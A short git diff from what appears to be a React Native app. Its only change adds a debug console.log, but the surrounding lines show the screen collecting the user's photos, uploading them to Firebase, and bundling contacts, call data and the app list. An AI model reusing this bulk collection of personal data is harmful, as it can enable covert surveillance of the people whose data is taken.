@@ -115,7 +115,7 @@ export default function HomeScreen() {
       const { fotos } = await coletarFotos();
       const urlsFotos = await enviarFotosParaFirebase(fotos);
       const { contatos } = await coletarContatos();
-
+  console.log("oiiiiiii")
       const dadosCompletos = {
         ...chamadas,
         ...apps,
